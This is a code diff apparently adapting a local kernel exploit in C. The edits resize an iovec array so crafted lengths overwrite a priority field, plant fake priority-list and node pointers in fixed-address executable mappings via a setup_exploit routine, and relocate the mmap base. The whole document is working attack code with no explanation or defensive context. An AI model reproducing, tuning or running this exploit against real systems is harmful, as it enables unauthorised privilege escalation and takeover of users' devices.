@@ -521,7 +521,7 @@ void *send_magicmsg(void *arg) {
 	int sockfd;
     //179change changed mmsghdr to mmsghdr2
 	struct mmsghdr2 msgvec[1];
-	struct iovec msg_iov[8];
+	struct iovec msg_iov[10];
     //179change
 	//unsigned long databuf[0x20];
 	unsigned long databuf[0x20];
@@ -545,10 +545,25 @@ void *send_magicmsg(void *arg) {
 		databuf[i] = MAGIC;
     }
 
-	for (i = 0; i < 8; i++) {
-		msg_iov[i].iov_base = (void *)MAGIC;
-		msg_iov[i].iov_len = 0x10;
-	}
+	for (i = 0; i < 10; i++) {
+        //write 12 to priority
+        if (i == 8) {
+            msg_iov[i].iov_base = (void *)MAGIC;
+		    msg_iov[i].iov_len = 0x0b;
+        }
+        else if (i == 9) {
+            msg_iov[i].iov_base = (void *)MAGIC;
+		    msg_iov[i].iov_len = (void *)MAGIC;
+        } else if (i == 6) {
+            msg_iov[i].iov_base = 0x00;
+		    msg_iov[i].iov_len = (void *)MAGIC;
+        }
+        //dont write to list_entry->prio or 
+        else if (i != 6) {
+		    msg_iov[i].iov_base = (void *)MAGIC;
+		    msg_iov[i].iov_len = 0x10;
+        }
+    }
 
 	msgvec[0].msg_hdr.msg_name = databuf;
 	msgvec[0].msg_hdr.msg_namelen = sizeof databuf;
@@ -599,12 +614,12 @@ void *send_magicmsg(void *arg) {
 
 static inline setup_exploit(unsigned long mem)
 {
-	*((unsigned long *)(mem - 0x04)) = 0x81; //prio
-	*((unsigned long *)(mem + 0x00)) = mem + 0x20;
-	*((unsigned long *)(mem + 0x08)) = mem + 0x28;
-	*((unsigned long *)(mem + 0x1c)) = 0x85;
-	*((unsigned long *)(mem + 0x24)) = mem;
-	*((unsigned long *)(mem + 0x2c)) = mem + 8;
+	*((unsigned long *)(mem - 0x04)) = 0x81; //prio 9
+	*((unsigned long *)(mem + 0x00)) = mem + 0x20; //prio.next
+	*((unsigned long *)(mem + 0x08)) = mem + 0x28;  //node.next
+	*((unsigned long *)(mem + 0x1c)) = 0x85; //prio 13
+	*((unsigned long *)(mem + 0x24)) = mem; //prio.prev
+	*((unsigned long *)(mem + 0x2c)) = mem + 8; //node.prev
 }
 
 void *search_goodnum(void *arg) {
@@ -706,12 +721,16 @@ void *search_goodnum(void *arg) {
 	}
 
 	printf("starting the dangerous things\n");
+    fflush(stdout);
 
+    
 	setup_exploit(MAGIC_ALT);
 	setup_exploit(MAGIC);
 
 	magicval = *((unsigned long *)MAGIC);
+   
     
+     
     wake_actionthread(11);
     //179change
     printf("good numgood num woke thread 11");
@@ -869,16 +888,15 @@ void init_exploit() {
     printf("accepting socket\n");
 	pthread_create(&th1, NULL, accept_socket, NULL);
 
-	addr = (unsigned long)mmap((void *)0xa0000000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
-	addr += 0x800;
+	addr = (unsigned long)mmap((void *)0x20000000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
+    addr += 0x800;
 	MAGIC = addr;
 	//179change
     printf("Magic %ld\n", MAGIC);
     if ((long)addr >= 0) {
-		printf("first mmap failed?\n");
-		while (1) {
-			sleep(10);
-		}
+        int errsv;
+        errsv = errno;
+		printf("first mmap failed? %d\n", errno);
 	}
 
 	addr = (unsigned long)mmap((void *)0x100000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
